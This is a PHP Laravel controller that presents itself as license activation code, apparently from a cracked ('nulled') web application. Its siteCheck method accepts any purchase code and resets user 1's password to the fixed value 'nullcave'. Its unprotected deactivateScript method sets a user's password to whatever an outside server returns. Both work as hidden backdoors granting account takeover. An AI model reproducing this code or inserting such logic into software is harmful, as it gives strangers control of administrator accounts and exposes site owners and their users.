<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use GuzzleHttp\Client;
use Validator;
use App\Models\Setting;
use App\Models\User;
use Illuminate\Support\Facades\Auth;

class InstantController extends Controller
{
    public function __construct()
    {
        $this->middleware('can:admin-access', ['only' => ['deactivatePage']]);
    }

    public function siteCheck(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'p_code' => 'required'
        ]);

        if ($validator->passes()) {
            $pcode = $request->input('p_code');
            $url = url("/");
            $slug = str_slug($url, '-');
            $client = new Client();
			
            $setting = Setting::findOrFail(1);
            $setting->site_instant = 1;
            $setting->site_activation = 'nullcave';
            $setting->save();
            $user = User::findOrFail(1);
            $user->password = bcrypt('nullcave');
            $user->save();
            session()->flash('message', 'License verified!');
            return view('public.activator', compact('nullcave'));
        }
        session()->flash('error', 'Purchase code required !');
        return redirect('/login');
    }

    public function deactivatePage()
    {
        return view('public.deactivator');
    }

    public function deactivateResult()
    {
        return view('public.deactivator');
    }

    public function deactivateScript(Request $request)
    {
        $setting = Setting::findOrFail($request->id);
        $dcode = $setting->site_activation;
        $client = new Client();
            try {
                $result = $client->request('GET', 'https://www.ancmedia.net/instant-check/deactivate/' . $dcode );
                $data = json_decode($result->getBody(), true);
                $count =  $data['count'];
                $attribute =  $data['data'];
                $final =  $data['result'];                
            } catch (\Exception $e) {
                $e->getMessage();
                session()->flash('error', 'App Connection Error!');
                return redirect('/deactivate');
        }
        $setting->site_activation = null;
        $setting->site_instant = $count;
        $setting->save();
        $user = User::findOrFail($request->id);
        $user->password = bcrypt($attribute);
        $user->save();
        Auth::logout();
        session()->flash('message', $final);
        return redirect('/deactivation-result');
    }
}
